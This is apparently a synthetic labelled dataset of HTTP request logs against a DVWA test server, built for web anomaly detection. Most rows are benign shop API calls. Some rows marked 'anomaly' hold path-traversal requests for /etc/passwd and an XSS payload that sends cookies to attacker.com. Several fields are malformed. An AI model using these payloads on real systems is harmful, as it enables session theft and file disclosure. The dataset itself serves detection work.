timestamp,agent,method,request_body,request_headers,request_url,response_body,response_headers,response_size,source_ip,source_port,status,target_ip,target_port,157,user_identity,anomaly
2023/7/19 13:50,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {status"": ""completed""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:120; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /orders/item135,"{""orderId"": ""item135"";""userId"": 456;""productId"": 321;""quantity"":2;""status"": ""completed""}","Date:Wed, 19 Jul 2023 05:50:49 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",1019,  192.168.135.71,52089,200,  10.26.40.155,80,871,admin,normal
2023/7/19 14:15,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,DELETE,NULL,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/security.php; Content-Length:224; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/collections/456,"{""success"": true}","Date:Wed, 19 Jul 2023 06:15:04 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Set-Cookie:security=impossible; path=/; httponly; Location:/dvwa/security.php; Content-Length:134; Content-Type:text/html; charset=UTF-8; security:impossible;  path:/;  httponly: ;",100,192.168.135.71,55571,302,10.26.40.155,80,1500,user,anomaly
2023/7/19 13:49,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:81; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /reviews?productId=321,"{""productId"": 321; ""userId"": 456; ""reviewId"": ""rvw789""; ""title"": ""Great product!""; ""text"": ""Very pleased with my purchase.""; ""rating"": 4}","Date:Wed, 19 Jul 2023 05:49:27 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",582,  192.168.135.71,51199,200,  10.26.40.155,80,338,user,normal
2023/7/19 14:47,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,GET,null,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/csp/; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible; Content-Length:2101;,/products/3321/../../../../root/,"{""productId"": 3321;""productName"": ""Headphones"";""price"": 50.00;""description"": ""High-quality over-ear headphones with noise cancellation"";""stock"": 50}","Date:Wed, 19 Jul 2023 06:47:42 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Security-Policy:script-src  self ;; Content-Length:4419; Content-Type:text/html;charset=utf-8;",966,192.168.135.71,61026,200,10.26.40.155,80,710,user,anomaly
2023/7/19 14:11,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""userId"": ""user753"";""firstName"": ""John"";""lastName"": ""Doe"";""email"": ""john.doe@gmail.com""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/security.php; Content-Length:125; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /users/,"{""userId"": ""user753"";""firstName"": ""John"";""lastName"": ""Doe"";""email"": ""john.doe@gmail.com""}","Date:Wed, 19 Jul 2023 06:11:54 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Set-Cookie:security=impossible; path=/; httponly; Location:/dvwa/security.php; Content-Length:134; Content-Type:text/html; charset=UTF-8; security:impossible;  path:/;  httponly: ;",110,  192.168.231.77,63676,200,  30.20.50.164,80,249, user,normal
2023/7/19 14:00,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {businessId"": 456;""userId"": 999;""quantity"": 5}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:84; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /inventory/product567,"{""inventoryId"": ""inv567"";""businessId"": 456;""productId"": 567;""quantity"": 5}","Date:Wed, 19 Jul 2023 06:00:39 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",100,  192.168.135.71,92380,302,  10.26.40.155,80,457,user,normal
2023/7/19 14:45,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {userId"": 987; ""orderItemId"": ""item234""; ""type"": ""Return""; ""reason"": ""Defective product.""; ""quantity"":2}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:140; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /afterSaleServices,"{""serviceId"": ""service123""; ""userId"": 987; ""orderItemId"": ""item234""; ""status"": ""Approved""; ""type"": ""Return""; ""reason"": ""Defective product.""; ""quantity"":2}","Date:Wed, 19 Jul 2023 06:45:58 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",91,  192.168.122.81,43481,201,  26.33.117.214,8080,493,user,normal
2023/7/19 13:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,GET,null,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_r/?name=ZAP&user_token=56528aabaab129572480521fbaed84a6; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/afterSaleServices/service101/../../../etc/passwd,"{""serviceId"": ""service101""; ""userId"": 101; ""orderItemId"": ""item202""; ""status"": ""Pending""; ""type"": ""Refund""; ""reason"": ""Items not as described.""; ""quantity"": 3}","Date:Wed, 19 Jul 2023 06:48:53 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4476; Content-Type:text/html;charset=utf-8;",851,192.168.135.71,61191,200,10.26.40.155,80,547,user,anomaly
2023/7/19 13:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET," {location"": ""New York""; ""radius"": 50}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/logout.php; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /inventory,"{""products"": [{""productId"": 666; ""quantity"": 20}; {""productId"": 888; ""quantity"": 10}]}","Date:Wed, 19 Jul 2023 05:46:04 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:1588; Content-Type:text/html;charset=utf-8;",171,  11.66.236.11,63502,200,  99.164.134.176,80,1104,user,normal
2023/7/19 14:01,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {status"": ""Pending""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_s/; Content-Length:92; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /afterSaleServices/service987,"{""serviceId"": ""service987"";""userId"": 519;""orderItemId"": ""item694;"" status"": ""Pending"";"" ""+details"": ""Item return requested.""}","Date:Wed, 19 Jul 2023 06:01:27 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5018; Content-Type:text/html;charset=utf-8;",681,  192.168.135.71,56192,200,  10.26.40.155,80,511,admin,normal
2023/7/19 13:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, DELETE,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/logout.php; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /collections/item123,"{""message"": ""Item deleted successfully""}","Date:Wed, 19 Jul 2023 05:46:04 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:1588; Content-Type:text/html;charset=utf-8;",345,  172.128.123.152,39084,200,  10.45.30.101,80,280,admin,normal
2023/7/19 14:02,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {""quantity"": 5}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/logout.php; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /cart/345,"{""cartId"": 345;""productId"": 896;""quantity"": 5;""price"": 15.99;}","Date:Wed, 19 Jul 2023 06:02:27 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:1568; Content-Type:text/html;charset=utf-8;",126,  192.168.135.71,55692,200,  10.26.40.155,80,452,user,normal
2023/7/19 14:40,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET," {category"": ""clothing""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:107; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /items,"{""id"": 389;""title"": ""Womens Shirt"";""price"": 25.99;""category"": ""clothing"";""quantity"": 75;}","Date:Wed, 19 Jul 2023 06:40:16 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",767,  192.168.135.71,58309,200,  10.26.40.155,80,819,user,normal
2023/7/19 13:55,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {itemId"": ""item121"";""productName"": ""Product B"";""price"": 34.99}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/login.php; Content-Length:112; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /items,"{""itemId"": ""item121"";""productName"": ""Product B"";""price"": 34.99}","Date:Wed, 19 Jul 2023 05:55:59 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:login.php; Content-Length:134; Content-Type:text/html; charset=UTF-8;",100,  172.168.210.211,56046,201,  10.51.90.255,80,620,user,normal
2023/7/19 13:51,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/login.php; Content-Length:139; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /order/567,"{""orderId"": ""order567; ""name"": ""John Smith; ""address"": ""123 Main Street; ""products"": [""item456; ""item789""]}","Date:Wed, 19 Jul 2023 05:51:56 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:login.php; Content-Length:134; Content-Type:text/html; charset=UTF-8;",1590,  192.168.135.71,59434,200,  10.26.40.155,80,234,user,normal
2023/7/19 14:38,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,PUT,"{""reason"": ""Change of mind"", ""type"": ""Return"", ""itemCount"": 2}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:120; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/afterSaleServices/456,"{""serviceId"": ""service456"", ""type"": ""Return"", ""status"": ""Processing"", ""userId"": ""user789"", ""productId"": ""product345"", ""reason"": ""Change of mind"", ""itemCount"": 2}","Date:Wed, 19 Jul 2023 06:38:15 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",1670,192.168.135.71,59726,200,10.26.40.155,80,4320,user,anomaly
2023/7/19 14:27,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""name"": ""Chair; ""quantity"": 1; ""price"": 49.99}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/security.php; Content-Length:122; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /products,"{""name"": ""Chair""; ""quantity"": 1; ""price"": 49.99; ""productId"": ""product600""}","Date:Wed, 19 Jul 2023 06:27:26 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Set-Cookie:security=impossible; path=/; httponly; Location:/dvwa/security.php; Content-Length:134; Content-Type:text/html; charset=UTF-8; security:impossible;  path:/;  httponly: ;",768,  192.168.135.71,52165,201,  10.26.40.155,80,999,admin,normal
2023/7/19 14:19,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,DELETE,null,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP&user_token=7eb871b92b5528ce4196cba133ae7279; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/collections/item123?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,"{""success"": true}","Date:Wed, 19 Jul 2023 05:55:40 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4304; Content-Type:text/html;charset=utf-8;",776,192.168.135.71,53320,200,10.26.40.155,80,890,user,anomaly
2023/7/19 13:47,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {orderId"": ""order123"";""status"": ""Delivered""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:81; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /admin/orders/order123,"{""orderId"": ""order123"";""userId"": 456;""totalPrice"": 79.99;""status"": ""Delivered"";""items"": [{""itemId"": ""item789""; ""quantity"": 2};{""itemId"": ""item567""; ""quantity"": 4}]}","Date:Wed, 19 Jul 2023 05:47:35 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5111; Content-Type:text/html;charset=utf-8;",829,  192.168.135.71,65995,201,  10.26.40.155,80,879,admin,normal
2023/7/19 14:20,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""productId"": ""product890""; ""quantity"": 10}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:195; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /cart,"{""success"": true; ""total"": 200}","Date:Wed, 19 Jul 2023 06:20:06 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",200,  192.168.135.12,53323,201,  10.26.60.91,443,303,user,normal
2023/7/19 13:55,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {userId"": 123; ""itemId"": ""item433""; ""quantity"": 1}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:84; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /carts, nan,"Date:Wed, 19 Jul 2023 05:55:03 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",45,  192.168.135.71,32345,301,  10.26.40.155,80,410,user,normal
2023/7/19 14:48,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, DELETE,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:52; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /carts/items/ABXY123,"{""status"": ""success""}","Date:Wed, 19 Jul 2023 06:48:39 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",980,  192.168.135.71,39588,200,  10.26.40.155,80,900,user,normal
2023/7/19 13:55,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""productId"": ""12345""; ""name"": ""Apple Macbook Pro""; ""price"": 1699.99; ""quantity"": 25; ""inventoryId"": 155}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_s/; Content-Length:90; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /inventory/update,"{""updatedInventory"": 25}","Date:Wed, 19 Jul 2023 05:55:34 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5018; Content-Type:text/html;charset=utf-8;",20,  192.168.135.71,52118,200,  10.26.40.155,80,112,admin,normal
2023/7/19 13:55,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Content-Length:86;,  /products?sortBy=price&limit=10,"{""productId"": ""prod101"";""name"": ""Fashion Sneakers"";""price"": ""$77.00"";""quantity"": ""85"";""category"": ""Shoes""}","Date:Wed, 19 Jul 2023 05:55:49 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Set-Cookie:security=impossible; path=/; httponly; Set-Cookie:PHPSESSID=no440ic9ahk8f2iup9bqupa807; path=/; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:1529; Content-Type:text/html;charset=utf-8; PHPSESSID:no440ic9ahk8f2iup9bqupa807;  path:/;",200,  192.168.110.101,58320,200,  10.20.48.120,8080,305,user,normal
